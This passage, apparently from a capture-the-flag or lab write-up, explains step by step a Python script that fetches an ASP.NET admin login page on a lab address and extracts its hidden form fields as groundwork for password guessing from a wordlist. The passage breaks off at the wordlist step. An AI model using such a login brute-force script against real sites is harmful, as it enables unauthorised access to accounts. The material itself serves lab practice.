# Automated Script Explanation => No Burp for this one => I will demo on YouTube the entire process 

---

## 1. Importing Libraries
```python
import requests
from bs4 import BeautifulSoup
import logging
```

### Libraries:
- **`requests`**: For making HTTP requests (GET and POST) to the target server.
- **`BeautifulSoup`**: Parses HTML and extracts specific data like hidden fields.
- **`logging`**: Logs messages for monitoring and debugging the script.

---

## 2. Logging Setup
```python
logging.basicConfig(level=logging.INFO)
```
- Configures logging to display messages at the `INFO` level or higher.
- Displays progress messages such as "Fetching the login page..." or "Trying password...".

---

## 3. Fetching the Login Page
```python
url = "http://10.10.12.86/Account/login.aspx?ReturnURL=%2fadmin"
session = requests.Session()

logging.info("Fetching the login page...")
response = session.get(url)
```

### Explanation:
- **`url`**: Target login page URL.
- **`session`**: Maintains cookies and session data across requests.
- **`session.get(url)`**: Fetches the login page, and stores the response.

---

## 4. Parsing the HTML
```python
soup = BeautifulSoup(response.content, 'html.parser')
viewstate = soup.find("input", {"id": "__VIEWSTATE"})['value']
eventvalidation = soup.find("input", {"id": "__EVENTVALIDATION"})['value']
```

### Explanation:
- **`BeautifulSoup`**: Parses the HTML content of the login page.
- **`soup.find`**: Locates hidden fields like:
  - `__VIEWSTATE`: Extracts the `value` attribute.
  - `__EVENTVALIDATION`: Retrieves the value required for the POST request.

---

## 5. Reading the Password Wordlist
